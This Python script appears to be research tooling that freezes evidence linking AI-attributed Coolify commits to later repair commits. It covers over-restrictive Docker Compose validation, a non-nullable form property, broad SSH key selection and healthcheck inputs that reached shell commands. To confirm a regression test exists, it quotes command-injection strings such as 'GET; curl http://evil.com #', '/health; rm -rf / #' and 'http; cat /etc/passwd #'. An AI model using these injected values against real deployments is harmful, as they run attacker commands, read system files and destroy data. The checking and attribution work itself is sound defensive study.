#!/usr/bin/env python3
"""Freeze high-confidence Coolify repairs recovered by the all-root lineage lane."""

from __future__ import annotations

import argparse
import hashlib
from pathlib import Path

from cohort_coolify_postgresql_query_idor_path_extension_witness import (
    _atomic_json,
    _commit_metadata,
    _git_blob,
    _is_ancestor,
)
from cohort_coolify_security_frontier_preservation_witness import _blame_line


COMPOSE_SECURITY_SHA = "cb1f571eb4b36da153d559246534f75683117299"
LIVEWIRE_MIGRATION_SHA = "f77ad4cbd9ee82d3015e36ab8d23121f1a8143dd"
ONBOARDING_REDESIGN_SHA = "7a008c859ad68332de72683ddb751e40a6487c38"

ENV_DEFAULT_REPAIR_SHA = "97868c32640a9875f1f6f0e4d215d2ad6655e65a"
COMPOSE_PATH_REPAIR_SHA = "468d5fe7d77dfe1f1f34770a81e45062c272c92d"
HEALTHCHECK_REPAIR_SHA = "30c0b37689801707c791d2f725773bfb14072bb2"
SSH_KEY_FILTER_REPAIR_SHA = "188c86ca45801c7ea2c4a8022b9ed90d73c1068e"

PARSER_PATH = "bootstrap/helpers/parsers.php"
VOLUME_TEST_PATH = "tests/Unit/VolumeArrayFormatSecurityTest.php"
STACK_FORM_PATH = "app/Livewire/Project/Service/StackForm.php"
BOARDING_PATH = "app/Livewire/Boarding/Index.php"
PRIVATE_KEY_PATH = "app/Models/PrivateKey.php"
HEALTHCHECK_FORM_PATH = "app/Livewire/Project/Shared/HealthChecks.php"
DEPLOYMENT_JOB_PATH = "app/Jobs/ApplicationDeploymentJob.php"
HEALTHCHECK_TEST_PATH = "tests/Unit/HealthCheckCommandInjectionTest.php"


def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--repository", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args(argv)


def _text_blob(repository: Path, revision: str, source_path: str) -> str:
    return _git_blob(repository, revision, source_path).decode("utf-8")


def _blob_record(repository: Path, revision: str, source_path: str) -> dict[str, str]:
    blob = _git_blob(repository, revision, source_path)
    return {
        "revision": revision,
        "path": source_path,
        "sha256": hashlib.sha256(blob).hexdigest(),
    }


def _nth_line(source: str, marker: str, occurrence: int = 1) -> int:
    matches = [
        index + 1
        for index, line in enumerate(source.splitlines())
        if marker in line
    ]
    if occurrence < 1 or len(matches) < occurrence:
        raise SystemExit(
            f"expected marker {marker!r} occurrence {occurrence}, found {matches}"
        )
    return matches[occurrence - 1]


def _evaluate_compose_underacceptance(
    candidate: str,
    default_repair: str,
    default_test: str,
    path_repair: str,
    path_test: str,
) -> dict[str, bool]:
    return {
        "candidate_only_exempts_simple_env_vars": (
            candidate.count("$isSimpleEnvVar = preg_match") >= 4
            and "$isEnvVarWithDefault = preg_match" not in candidate
            and "$isEnvVarWithPath = preg_match" not in candidate
        ),
        "candidate_routes_other_values_to_shell_path_rejection": (
            "if (! $isSimpleEnvVar)" in candidate
            and "validateShellSafePath($source, 'volume source')" in candidate
        ),
        "default_repair_adds_safe_default_lane": (
            "$isEnvVarWithDefault = preg_match" in default_repair
            and "if (! $isSimpleEnvVar && ! $isEnvVarWithDefault)" in default_repair
        ),
        "default_repair_has_regression_test": all(
            marker in default_test
            for marker in (
                "array-format with safe environment variable default",
                "${DATA_PATH:-./data}",
                "not->toThrow(Exception::class)",
            )
        ),
        "path_repair_adds_safe_concatenation_lane": (
            path_repair.count("$isEnvVarWithPath = preg_match") >= 3
            and "! $isEnvVarWithDefault && ! $isEnvVarWithPath" in path_repair
        ),
        "path_repair_names_reported_regression": all(
            marker in path_test
            for marker in (
                "reported issue #7127",
                "${VOLUMES_PATH}/mysql",
                "not->toThrow(Exception::class)",
            )
        ),
        "repairs_keep_malicious_default_test": (
            "array-format with malicious environment variable default" in path_test
        ),
    }


def _evaluate_stack_form_nullable(migration: str, repair: str) -> dict[str, bool]:
    return {
        "migration_declares_non_nullable_compose": (
            "public string $dockerCompose;" in migration
        ),
        "migration_requires_compose": ("'dockerCompose' => 'required'" in migration),
        "migration_assigns_model_value_to_typed_property": (
            "$this->dockerCompose = $this->service->docker_compose;" in migration
        ),
        "repair_makes_property_nullable": (
            "public ?string $dockerCompose = null;" in repair
        ),
        "repair_makes_rule_nullable": ("'dockerCompose' => 'nullable'" in repair),
        "repair_preserves_bidirectional_sync": all(
            marker in repair
            for marker in (
                "$this->service->docker_compose = $this->dockerCompose;",
                "$this->dockerCompose = $this->service->docker_compose;",
            )
        ),
    }


def _evaluate_onboarding_key_filter(
    candidate: str, repair: str, repair_model: str
) -> dict[str, bool]:
    broad_query = (
        "PrivateKey::ownedByCurrentTeam(['name'])->where('id', '!=', 0)->get();"
    )
    filtered_query = (
        "PrivateKey::ownedAndOnlySShKeys(['name'])->where('id', '!=', 0)->get();"
    )
    return {
        "candidate_lists_all_team_private_keys_twice": candidate.count(broad_query) == 2,
        "candidate_auto_selects_first_broad_key": (
            "$this->selectedExistingPrivateKey = $this->privateKeys->first()->id;"
            in candidate
        ),
        "repair_filters_both_onboarding_queries": repair.count(filtered_query) == 2,
        "repair_helper_excludes_git_keys": all(
            marker in repair_model
            for marker in (
                "function ownedAndOnlySShKeys",
                "->where('is_git_related', false)",
            )
        ),
    }


def _evaluate_healthcheck_preservation(
    migration: str, repair_form: str, repair_job: str, repair_test: str
) -> dict[str, bool]:
    weak_rules = (
        "'healthCheckPath' => 'string'",
        "'healthCheckPort' => 'nullable|string'",
        "'healthCheckHost' => 'string'",
        "'healthCheckMethod' => 'string'",
        "'healthCheckScheme' => 'string'",
    )
    persistence = (
        "$this->resource->health_check_method = $this->healthCheckMethod;",
        "$this->resource->health_check_scheme = $this->healthCheckScheme;",
        "$this->resource->health_check_host = $this->healthCheckHost;",
        "$this->resource->health_check_port = $this->healthCheckPort;",
        "$this->resource->health_check_path = $this->healthCheckPath;",
    )
    return {
        "migration_rebuilds_string_only_rules": all(
            marker in migration for marker in weak_rules
        ),
        "migration_persists_healthcheck_shell_inputs": all(
            marker in migration for marker in persistence
        ),
        "repair_form_adds_allowlists_and_port_bounds": all(
            marker in repair_form
            for marker in (
                "in:GET,HEAD,POST,OPTIONS",
                "in:http,https",
                "regex:/^[a-zA-Z0-9.\\-_]+$/",
                "nullable|integer|min:1|max:65535",
                "regex:#^[a-zA-Z0-9/\\-_.~%]+$#",
            )
        ),
        "repair_job_sanitizes_runtime_values": all(
            marker in repair_job
            for marker in (
                "$this->sanitizeHealthCheckValue($this->application->health_check_method",
                "$this->sanitizeHealthCheckValue($this->application->health_check_scheme",
                "$this->sanitizeHealthCheckValue($this->application->health_check_host",
                "$this->sanitizeHealthCheckValue($this->application->health_check_path",
                "$url = escapeshellarg",
            )
        ),
        "repair_tests_all_injection_inputs": all(
            marker in repair_test
            for marker in (
                "health_check_host' => 'localhost; id > /tmp/pwned #",
                "health_check_method' => 'GET; curl http://evil.com #",
                "health_check_path' => '/health; rm -rf / #",
                "health_check_scheme' => 'http; cat /etc/passwd #",
                "health_check_port' => '8080; whoami",
            )
        ),
    }


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)
    repository = args.repository.resolve()
    if not repository.is_dir() or not (repository / ".git").exists():
        raise SystemExit(f"repository is not a Git checkout: {repository}")

    compose_candidate = _text_blob(repository, COMPOSE_SECURITY_SHA, PARSER_PATH)
    default_repair = _text_blob(repository, ENV_DEFAULT_REPAIR_SHA, PARSER_PATH)
    default_test = _text_blob(repository, ENV_DEFAULT_REPAIR_SHA, VOLUME_TEST_PATH)
    path_repair = _text_blob(repository, COMPOSE_PATH_REPAIR_SHA, PARSER_PATH)
    path_test = _text_blob(repository, COMPOSE_PATH_REPAIR_SHA, VOLUME_TEST_PATH)
    stack_migration = _text_blob(repository, LIVEWIRE_MIGRATION_SHA, STACK_FORM_PATH)
    stack_repair = _text_blob(repository, COMPOSE_PATH_REPAIR_SHA, STACK_FORM_PATH)
    onboarding_candidate = _text_blob(
        repository, ONBOARDING_REDESIGN_SHA, BOARDING_PATH
    )
    onboarding_repair = _text_blob(repository, SSH_KEY_FILTER_REPAIR_SHA, BOARDING_PATH)
    private_key_repair = _text_blob(
        repository, SSH_KEY_FILTER_REPAIR_SHA, PRIVATE_KEY_PATH
    )
    health_migration = _text_blob(
        repository, LIVEWIRE_MIGRATION_SHA, HEALTHCHECK_FORM_PATH
    )
    health_repair_form = _text_blob(
        repository, HEALTHCHECK_REPAIR_SHA, HEALTHCHECK_FORM_PATH
    )
    health_repair_job = _text_blob(
        repository, HEALTHCHECK_REPAIR_SHA, DEPLOYMENT_JOB_PATH
    )
    health_repair_test = _text_blob(
        repository, HEALTHCHECK_REPAIR_SHA, HEALTHCHECK_TEST_PATH
    )

    evaluations = {
        "compose_validation_underacceptance": _evaluate_compose_underacceptance(
            compose_candidate,
            default_repair,
            default_test,
            path_repair,
            path_test,
        ),
        "stack_form_nullable_contract": _evaluate_stack_form_nullable(
            stack_migration, stack_repair
        ),
        "onboarding_ssh_key_filter": _evaluate_onboarding_key_filter(
            onboarding_candidate, onboarding_repair, private_key_repair
        ),
        "healthcheck_validation": _evaluate_healthcheck_preservation(
            health_migration,
            health_repair_form,
            health_repair_job,
            health_repair_test,
        ),
    }

    candidate_shas = (
        COMPOSE_SECURITY_SHA,
        LIVEWIRE_MIGRATION_SHA,
        ONBOARDING_REDESIGN_SHA,
    )
    metadata = {
        sha: _commit_metadata(repository, sha) for sha in candidate_shas
    }
    edges = [
        {
            "candidate_sha": COMPOSE_SECURITY_SHA,
            "fix_sha": ENV_DEFAULT_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_OVERRESTRICTIVE_ENV_DEFAULT_VALIDATION",
            "mechanism_group": "docker_compose_volume_validation_underacceptance",
        },
        {
            "candidate_sha": COMPOSE_SECURITY_SHA,
            "fix_sha": COMPOSE_PATH_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_OVERRESTRICTIVE_ENV_PATH_VALIDATION",
            "mechanism_group": "docker_compose_volume_validation_underacceptance",
        },
        {
            "candidate_sha": LIVEWIRE_MIGRATION_SHA,
            "fix_sha": COMPOSE_PATH_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_NULLABLE_COMPOSE_CONTRACT_REGRESSION",
            "mechanism_group": "livewire_stack_form_nullable_contract",
        },
        {
            "candidate_sha": LIVEWIRE_MIGRATION_SHA,
            "fix_sha": HEALTHCHECK_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_HEALTHCHECK_INPUT_DATAFLOW_PRESERVATION_CONTRIBUTOR",
            "mechanism_group": "healthcheck_command_injection",
        },
        {
            "candidate_sha": ONBOARDING_REDESIGN_SHA,
            "fix_sha": SSH_KEY_FILTER_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_BROAD_SSH_KEY_SELECTION_PRESERVATION_CONTRIBUTOR",
            "mechanism_group": "onboarding_ssh_key_scope",
        },
    ]
    ancestry = {
        f"{edge['candidate_sha']}->{edge['fix_sha']}": _is_ancestor(
            repository, str(edge["candidate_sha"]), str(edge["fix_sha"])
        )
        for edge in edges
    }

    line_origins = {
        "compose_simple_only_guard": _blame_line(
            repository,
            COMPOSE_SECURITY_SHA,
            PARSER_PATH,
            _nth_line(compose_candidate, "if (! $isSimpleEnvVar)"),
            "simple-only array volume exemption",
        ),
        "stack_non_nullable_property": _blame_line(
            repository,
            LIVEWIRE_MIGRATION_SHA,
            STACK_FORM_PATH,
            _nth_line(stack_migration, "public string $dockerCompose;"),
            "non-null compose property",
        ),
        "healthcheck_weak_host_rule": _blame_line(
            repository,
            LIVEWIRE_MIGRATION_SHA,
            HEALTHCHECK_FORM_PATH,
            _nth_line(health_migration, "'healthCheckHost' => 'string'"),
            "string-only healthcheck host rule",
        ),
        "onboarding_broad_key_query": _blame_line(
            repository,
            ONBOARDING_REDESIGN_SHA,
            BOARDING_PATH,
            _nth_line(onboarding_candidate, "PrivateKey::ownedByCurrentTeam(['name'])"),
            "broad team private-key query",
        ),
        "default_repair_guard": _blame_line(
            repository,
            ENV_DEFAULT_REPAIR_SHA,
            PARSER_PATH,
            _nth_line(default_repair, "$isEnvVarWithDefault = preg_match"),
            "safe env-default exemption",
        ),
        "path_repair_guard": _blame_line(
            repository,
            COMPOSE_PATH_REPAIR_SHA,
            PARSER_PATH,
            _nth_line(path_repair, "$isEnvVarWithPath = preg_match"),
            "safe env-path exemption",
        ),
        "nullable_property_repair": _blame_line(
            repository,
            COMPOSE_PATH_REPAIR_SHA,
            STACK_FORM_PATH,
            _nth_line(stack_repair, "public ?string $dockerCompose = null;"),
            "nullable compose property",
        ),
        "healthcheck_runtime_repair": _blame_line(
            repository,
            HEALTHCHECK_REPAIR_SHA,
            DEPLOYMENT_JOB_PATH,
            _nth_line(
                health_repair_job,
                "$method = $this->sanitizeHealthCheckValue",
            ),
            "runtime healthcheck method sanitizer",
        ),
        "ssh_filter_repair": _blame_line(
            repository,
            SSH_KEY_FILTER_REPAIR_SHA,
            PRIVATE_KEY_PATH,
            _nth_line(private_key_repair, "->where('is_git_related', false)"),
            "exclude Git-related keys",
        ),
    }
    expected_origins = {
        "compose_simple_only_guard": COMPOSE_SECURITY_SHA,
        "stack_non_nullable_property": LIVEWIRE_MIGRATION_SHA,
        "healthcheck_weak_host_rule": LIVEWIRE_MIGRATION_SHA,
        "onboarding_broad_key_query": ONBOARDING_REDESIGN_SHA,
        "default_repair_guard": ENV_DEFAULT_REPAIR_SHA,
        "path_repair_guard": COMPOSE_PATH_REPAIR_SHA,
        "nullable_property_repair": COMPOSE_PATH_REPAIR_SHA,
        "healthcheck_runtime_repair": HEALTHCHECK_REPAIR_SHA,
        "ssh_filter_repair": SSH_KEY_FILTER_REPAIR_SHA,
    }

    witness_passed = bool(
        all(item["explicit_claude_signal"] is True for item in metadata.values())
        and all(ancestry.values())
        and all(all(checks.values()) for checks in evaluations.values())
        and all(
            line_origins[key]["origin_sha"] == expected
            for key, expected in expected_origins.items()
        )
    )

    source_pairs = (
        (COMPOSE_SECURITY_SHA, PARSER_PATH),
        (ENV_DEFAULT_REPAIR_SHA, PARSER_PATH),
        (ENV_DEFAULT_REPAIR_SHA, VOLUME_TEST_PATH),
        (COMPOSE_PATH_REPAIR_SHA, PARSER_PATH),
        (COMPOSE_PATH_REPAIR_SHA, VOLUME_TEST_PATH),
        (LIVEWIRE_MIGRATION_SHA, STACK_FORM_PATH),
        (COMPOSE_PATH_REPAIR_SHA, STACK_FORM_PATH),
        (ONBOARDING_REDESIGN_SHA, BOARDING_PATH),
        (SSH_KEY_FILTER_REPAIR_SHA, BOARDING_PATH),
        (SSH_KEY_FILTER_REPAIR_SHA, PRIVATE_KEY_PATH),
        (LIVEWIRE_MIGRATION_SHA, HEALTHCHECK_FORM_PATH),
        (HEALTHCHECK_REPAIR_SHA, HEALTHCHECK_FORM_PATH),
        (HEALTHCHECK_REPAIR_SHA, DEPLOYMENT_JOB_PATH),
        (HEALTHCHECK_REPAIR_SHA, HEALTHCHECK_TEST_PATH),
    )
    payload = {
        "schema_version": 1,
        "artifact_kind": "coolify_full_lineage_recovery_witness",
        "repository_identity": "github.com/coollabsio/coolify",
        "candidate_edges": edges,
        "candidate_metadata": metadata,
        "ancestry": ancestry,
        "evaluations": evaluations,
        "line_origins": line_origins,
        "source_blobs": [
            _blob_record(repository, revision, source_path)
            for revision, source_path in source_pairs
        ],
        "witness_passed": witness_passed,
        "counting": {
            "candidate_fix_true_positive_edge_count": len(edges),
            "unique_ai_candidate_count": len(
                {edge["candidate_sha"] for edge in edges}
            ),
            "mechanism_group_count": len(
                {edge["mechanism_group"] for edge in edges}
            ),
            "earliest_mechanism_root_is_ai_not_asserted": True,
            "unique_advisory_increment_not_asserted": True,
        },
        "claim_boundary": (
            "These five candidate-fix edges are source-level repair or preservation "
            "contributors recovered by the all-root fix-preimage lane. The Docker "
            "Compose security commit introduced over-restrictive validation that "
            "rejected safe environment defaults and path concatenation. The Livewire "
            "migration rebuilt a nullable model field as a required non-null property "
            "and preserved string-only healthcheck inputs later used in shell commands. "
            "The onboarding redesign rebuilt broad private-key selection that a later "
            "repair narrowed to non-Git SSH keys. These are edge claims, not five unique "
            "vulnerabilities or proof that AI was the earliest mechanism origin. "
            "Evidence is frozen source, exact blame ownership, ancestry, explicit commit "
            "attribution, and downstream regression tests; no runtime reproduction is "
            "asserted."
        ),
    }
    _atomic_json(args.output, payload)
    if not witness_passed:
        raise SystemExit("Coolify full-lineage recovery witness failed")

    print("Coolify full-lineage recovery witness frozen")
    print(f"  candidate-fix TP edges : {len(edges)}")
    print(f"  unique AI candidates   : {payload['counting']['unique_ai_candidate_count']}")
    print(f"  mechanism groups       : {payload['counting']['mechanism_group_count']}")
    print(f"  output                 : {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
